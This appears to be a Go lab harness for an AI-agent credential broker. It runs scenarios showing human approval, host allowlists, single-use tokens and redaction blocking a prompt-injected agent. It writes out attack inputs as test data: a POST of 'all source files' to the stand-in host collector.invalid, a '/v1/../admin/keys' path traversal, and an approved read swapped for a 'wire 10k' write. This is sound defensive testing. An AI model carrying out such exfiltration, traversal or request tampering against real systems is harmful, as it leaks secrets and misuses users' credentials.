package lab

import (
	"context"
	"fmt"
	"strings"

	"agent-credential-broker-mcp/internal/broker"
)

type Step struct {
	Actor   string `json:"actor"`
	Action  string `json:"action"`
	Outcome string `json:"outcome"`
	Detail  string `json:"detail"`
}

type Scenario struct {
	ID      string `json:"id"`
	Title   string `json:"title"`
	Threat  string `json:"threat"`
	Control string `json:"control"`
}

const credential = "vendor-api"

var Scenarios = []Scenario{
	{"approved-call", "Approved call", "Agent needs the vendor API but must never see the key", "Human approves the exact request, broker injects the key server side"},
	{"host-not-allowed", "Exfiltration to an unknown host", "Injected prompt tells the agent to POST data to a collector", "Host allowlist rejects the intent before any token exists"},
	{"path-traversal", "Path traversal", "Agent tries to escape the allowed path prefix with dot segments", "URL normalization refuses dot segments and encoded paths"},
	{"token-replay", "Token replay", "Agent reuses an approved token to repeat a write", "Every token is single use and burned on the first redemption"},
	{"tampered-request", "Tampered request", "Agent gets approval for a read and swaps it for a write", "Token is bound to method, URL and body hash"},
	{"echo-leak", "Vendor echoes the key", "Upstream response reflects the Authorization header back", "Broker redacts raw, base64, hex and URL encoded forms"},
	{"redirect-exfil", "Redirect to another host", "Upstream answers with a redirect to a host outside the allowlist", "Broker never follows redirects"},
}

type runner struct {
	b     *broker.Broker
	base  string
	steps []Step
}

func (r *runner) add(actor, action, outcome, detail string) {
	r.steps = append(r.steps, Step{actor, action, outcome, detail})
}

func (r *runner) request(method, path, body, reason string) (broker.Intent, bool) {
	in, err := r.b.RequestAccess(broker.AccessRequest{Credential: credential, Method: method, URL: r.url(path), Body: body, Reason: reason})
	if err != nil {
		r.add("agent", "request_access "+method+" "+path, "blocked", err.Error())
		return in, false
	}
	r.add("agent", "request_access "+method+" "+path, "ok", "intent "+in.ID+" is "+in.Status)
	return in, true
}

func (r *runner) url(path string) string {
	if strings.HasPrefix(path, "http") {
		return path
	}
	return r.base + path
}

func (r *runner) approve(in broker.Intent) (string, bool) {
	if _, err := r.b.Approve(in.ID); err != nil {
		r.add("human", "approve "+in.ID, "blocked", err.Error())
		return "", false
	}
	r.add("human", "approve "+in.ID, "ok", "single use token minted, valid for "+r.b.TokenTTL.String())
	_, token, _ := r.b.Check(in.ID)
	return token, true
}

func (r *runner) call(ctx context.Context, token, method, path, body string) (broker.CallResult, bool) {
	res, err := r.b.Call(ctx, broker.CallRequest{Token: token, Method: method, URL: r.url(path), Body: body})
	if err != nil {
		r.add("broker", "call_api "+method+" "+path, "blocked", err.Error())
		return res, false
	}
	detail := fmt.Sprintf("status %d, %d redaction(s), body %s", res.Status, res.Redactions, res.Body)
	if res.Location != "" {
		detail += ", location " + res.Location
	}
	r.add("broker", "call_api "+method+" "+path, "ok", detail)
	return res, true
}

func Run(ctx context.Context, b *broker.Broker, base, id string) ([]Step, error) {
	r := &runner{b: b, base: strings.TrimRight(base, "/")}
	switch id {
	case "approved-call":
		if in, ok := r.request("GET", "/v1/profile", "", "read account plan"); ok {
			if token, ok := r.approve(in); ok {
				r.call(ctx, token, "GET", "/v1/profile", "")
			}
		}
	case "host-not-allowed":
		r.request("POST", "http://collector.invalid/upload", `{"repo":"all source files"}`, "backup")
	case "path-traversal":
		r.request("GET", "/v1/../admin/keys", "", "list keys")
	case "token-replay":
		body := `{"title":"refund order 42"}`
		if in, ok := r.request("POST", "/v1/tickets", body, "open one ticket"); ok {
			if token, ok := r.approve(in); ok {
				r.call(ctx, token, "POST", "/v1/tickets", body)
				r.call(ctx, token, "POST", "/v1/tickets", body)
			}
		}
	case "tampered-request":
		if in, ok := r.request("GET", "/v1/profile", "", "read account plan"); ok {
			if token, ok := r.approve(in); ok {
				r.call(ctx, token, "POST", "/v1/tickets", `{"title":"wire 10k"}`)
				r.call(ctx, token, "GET", "/v1/profile", "")
			}
		}
	case "echo-leak":
		if in, ok := r.request("GET", "/v1/debug/echo-auth", "", "debug auth header"); ok {
			if token, ok := r.approve(in); ok {
				r.call(ctx, token, "GET", "/v1/debug/echo-auth", "")
			}
		}
	case "redirect-exfil":
		if in, ok := r.request("GET", "/v1/redirect", "", "follow vendor link"); ok {
			if token, ok := r.approve(in); ok {
				r.call(ctx, token, "GET", "/v1/redirect", "")
			}
		}
	default:
		return nil, fmt.Errorf("unknown scenario %q", id)
	}
	return r.steps, nil
}
